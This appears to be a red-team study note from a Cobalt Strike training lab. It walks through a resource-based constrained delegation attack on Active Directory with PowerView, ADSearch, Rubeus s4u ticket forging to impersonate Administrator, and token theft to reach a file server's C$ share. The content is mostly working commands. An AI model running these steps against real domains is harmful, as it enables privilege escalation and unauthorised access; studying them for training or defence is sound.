
> [!NOTE] **Note**
> This is much easier to do through a SOCKS proxy using PowerView
> 
> Setup found [here](obsidian://open?vault=Offensive%20Security&file=root%2FRed%20Teaming%2FCobalt%20Strike%20Assumed%20Breach%2F10.%20Pivoting%2F_%20Main)

Import PowerView
```powershell
ipmo C:\Tools\PowerSploit\Recon\PowerView.ps1
```

Setup credentials to be used
```powershell
‌$Cred = Get-Credential CONTOSO\rsteel
```

Find principals that have WriteProperty privileges on the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute of computers.
```powershell
Get-DomainComputer -Server 'lon-dc-1' -Credential $Cred | Get-DomainObjectAcl -Server 'lon-dc-1' -Credential $Cred | ? { $_.ObjectAceType -eq '3f78c3e5-f79a-46bd-a0b8-9d18116ddc79' -and $_.ActiveDirectoryRights -eq 'WriteProperty' } | select ObjectDN,SecurityIdentifier

Get-DomainComputer -Credential $Cred | Get-DomainObjectAcl | ? { $_.ObjectAceType -eq '3f78c3e5-f79a-46bd-a0b8-9d18116ddc79' -and $_.ActiveDirectoryRights -eq 'WriteProperty' } | select ObjectDN,SecurityIdentifier
```

> OR
 
```powershell
execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=computer)(msDS-AllowedToActOnBehalfOfOtherIdentity=*))" --attributes dnshostname,samaccountname,msDS-AllowedToActOnBehalfOfOtherIdentity --json

execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=user)(msDS-AllowedToActOnBehalfOfOtherIdentity=*))" --attributes dnshostname,samaccountname,msDS-AllowedToActOnBehalfOfOtherIdentity --json
```

 > OR

```powershell
ldapsearch "(&(objectClass=computer)(msDS-AllowedToActOnBehalfOfOtherIdentity=*))" --attributes samAccountName,dnshostname,msDS-AllowedToActOnBehalfOfOtherIdentity,objectsid,ntsecuritydescriptor

```

Resolve the SID to a domain group/user.
```powershell
Get-ADGroup -Filter 'objectsid -eq "SID"' -Server 'lon-dc-1' -Credential $Cred
```

Check for any existing RBCD configurations.
```powershell
Get-ADComputer -Filter * -Properties PrincipalsAllowedToDelegateToAccount -Server 'lon-dc-1' -Credential $Cred | select Name,PrincipalsAllowedToDelegateToAccount
```

Add RBCD between _RBCD machine_ and _controlled host_, making sure not to overwrite the existing entry.
```powershell
$existing_entry = Get-ADComputer -Identity 'existing_RBCD_entry' -Server 'lon-dc-1' -Credential $Cred

$controlled_host = Get-ADComputer -Identity 'controlled_host' -Server 'lon-dc-1' -Credential $Cred

Set-ADComputer -Identity 'RBCD_Machine' -PrincipalsAllowedToDelegateToAccount $existing_entry,$controlled_host -Server 'lon-dc-1' -Credential $Cred
```

Verify that controlled host was added was added.
```powershell
Get-ADComputer -Identity 'RBCD_host' -Properties PrincipalsAllowedToDelegateToAccount -Server 'lon-dc-1' -Credential $Cred | select Name,PrincipalsAllowedToDelegateToAccount
```

In the high-integrity Beacon, obtain a TGT for the controlled host.
```powershell
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x3e7 /service:krbtgt /nowrap
```

Request a usable service ticket for cifs/RBCD_host impersonating the default domain administrator.
```powershell
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:lon-wkstn-1$ /impersonateuser:Administrator /msdsspn:cifs/lon-fs-1 /nowrap /ticket:
```

Inject the ticket into a sacrificial logon session.
```powershell
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:CONTOSO.COM /username:Administrator /password:FakePass /ticket:
```

Impersonate spawned process and confirm
```powershell
steal_token [PID]
run klist
ls \\lon-fs-1\c$

rev2self       <--- Drop impersonation
kill [PID]
```